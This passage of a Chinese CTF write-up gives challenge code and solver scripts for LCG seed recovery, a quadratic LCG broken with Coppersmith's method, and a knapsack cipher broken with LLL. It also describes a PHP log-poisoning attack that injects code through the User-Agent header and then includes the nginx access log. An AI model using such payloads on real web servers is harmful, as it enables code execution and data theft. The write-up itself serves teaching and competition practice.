class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    s1 = (state1&lt;&lt;<span class="number">16</span>)+i</span><br><span class="line">    s2 = (a*s1+b) % m</span><br><span class="line">    <span class="keyword">if</span> s2&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        seed = ((s1-b)*inverse_mod(a,m))%m</span><br><span class="line">        <span class="built_in">print</span>(seed)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1315807869</span></span><br><span class="line"><span class="comment"># 710396196</span></span><br><span class="line"><span class="comment"># 104984523</span></span><br></pre></td></tr></table></figure><p>三个结果分别代入求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line">seed = [<span class="number">1315807869</span>,<span class="number">710396196</span>,<span class="number">104984523</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> seed:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.a = <span class="number">3939333498</span></span><br><span class="line">            self.b = <span class="number">3662432446</span></span><br><span class="line">            self.m = <span class="number">2271373817</span></span><br><span class="line">            self.seed = k</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">            <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    lcg = LCG()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(c[i] ^^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span></span><br><span class="line"><span class="comment"># Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span></span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RHODES_ELITE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>二阶LCG + 4位一轮爆破，用二元Coppersmith方法求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        R = f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            base = N ^ (m - i) * f ^ i</span><br><span class="line">            <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">            H.append(h)</span><br><span class="line">            I = H.ideal()</span><br><span class="line">            <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                H.pop()</span><br><span class="line">            <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                    root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                    roots.append(root)</span><br><span class="line">                    <span class="keyword">return</span> roots</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">c = <span class="number">636205571590</span></span><br><span class="line">p = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) ^ <span class="number">2</span> + b * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) + c - (state2 &lt;&lt; <span class="number">12</span>) - s2_low</span><br><span class="line">state1 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">0</span>] + (state1 &lt;&lt; <span class="number">12</span>)</span><br><span class="line">state2 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">1</span>] + (state2 &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * x * x + b * x + c - state1</span><br><span class="line">seed = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 626844643882</span></span><br></pre></td></tr></table></figure><p>代入逐4位爆破flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lcg</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.p = <span class="number">18068433704538283397</span></span><br><span class="line">        self.a = <span class="number">956366446278</span></span><br><span class="line">        self.b = <span class="number">1061992537343</span></span><br><span class="line">        self.c = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">l = lcg()</span><br><span class="line">seed = l.seed</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">c = <span class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">c = <span class="built_in">hex</span>(c)[<span class="number">2</span>:].rjust(<span class="number">9</span>*<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef-&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">nowc</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(nowc)</span><br><span class="line">    t=l.<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(x).hexdigest().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)%(seed**<span class="number">3</span>)^(t%<span class="number">100</span>))[<span class="number">2</span>:].rjust(<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>) == nowc, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    flag += <span class="built_in">pow</span>(c[<span class="number">30</span>*i:<span class="number">30</span>*(i+<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m,lenth</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">&#x27;0&#x27;</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plain,pk</span>):</span></span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><p>背包密码系统，LLL算法解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">pubKey = []</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line">encoded = </span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(M))</span><br><span class="line">        </span><br><span class="line"><span class="string">b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>文件包含，绕 <code>require_once</code>，burpsuite或 <code>curl -A</code> 修改User-Agent为 <code>&lt;?php show_source(&quot;flag.php&quot;);?&gt;</code>，</p><p>然后用日志包含 <code>?file=/var/log/nginx/access.log</code> 得到flag。</p><p>​    </p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><blockquote><p>Post something</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 